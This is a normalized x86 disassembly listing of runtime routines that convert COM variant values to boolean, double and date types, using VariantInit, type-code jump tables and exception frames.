mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_3a70420
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3a72094
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a71e7c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_3a71e7c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_3a72337 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_3a63418
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a71f28
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_3a720e0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_3a72524
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a725d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_3a746a4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x5 ]
call sub_3a69b80
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a725dd
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
movzx edx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_3a708b4
jmp r-xdata
movzx edx [ ebx ]
mov cx 0xb
call sub_3a708b4
cmp [ ebp - 0x8 ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
jmp r-xdata
sub_3a725e8
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0xb
call sub_3a708b4
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_3a72628
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a7267c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_3a70f80
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_3a726d8
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a72683
lea eax [ ebp - 0x11 ]
call sub_3a70c58
retn
sub_3a7268c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_3a7618c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_3a726d8
push ebx
push ecx
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a726f2 ]
mov eax ebx
call sub_3a72524
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_3a72524
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a726d8
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_3a725e8
mov [ esp ] al
jmp r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_3a72628
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_3a70420
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_3a7268c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_3a725e8
mov [ esp ] al
mov eax ebx
call sub_3a725e8
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_3a728b8 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_3a72524
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a726d8
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_3a72a38
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a72aed
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_3a746a4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_3a6aff8
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
movzx edx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_3a708b4
jmp r-xdata
fld [ ebp - 0x20 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x5
call sub_3a708b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a72af4
lea eax [ ebp - 0x24 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3a72afc
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x5
call sub_3a708b4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_3a72b48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a72b9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_3a70f80
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_3a72bf8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a72ba4
lea eax [ ebp - 0x18 ]
call sub_3a70c58
retn
sub_3a72bac
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_3a7618c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_3a72bf8
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a72c14 ]
mov eax ebx
call sub_3a72a38
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_3a72a38
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a72bf8
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a72afc
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_3a72b48
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_3a70420
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_3a72bac
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_3a72afc
fstp [ esp ]
fwait
mov eax ebx
call sub_3a72afc
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_3a72df0 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_3a72a38
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a72bf8
fstp [ esp ]
fwait
jmp r-xdata
sub_3a72f8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_3a730f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3a72bf8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_3a72fae ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_3a70420
sub_3a7311c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a731f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_3a746a4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x10 ]
call sub_3a6c9d4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a731ff
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_3a6b014
test al al
je r-xdata
movzx edx [ ebx ]
mov cx 0x7
call sub_3a708b4
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_3a708b4
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_3a73208
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_3a708b4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a73268
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_3a708b4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_3a732b4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a73309
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_3a70f80
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_3a73364
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a73310
lea eax [ ebp - 0x18 ]
call sub_3a70c58
retn
sub_3a73318
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_3a7618c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_3a73364
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a73380 ]
mov eax ebx
call sub_3a7311c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a73268
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_3a7311c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_3a73208
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a73364
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a73268
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_3a732b4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_3a70420
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_3a73318
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_3a73268
fstp [ esp ]
fwait
mov eax ebx
call sub_3a73268
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_3a7354a ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a73268
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_3a7311c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_3a73208
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a73364
fstp [ esp ]
fwait
jmp r-xdata
sub_3a736b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_3a73760
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_3a746a4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
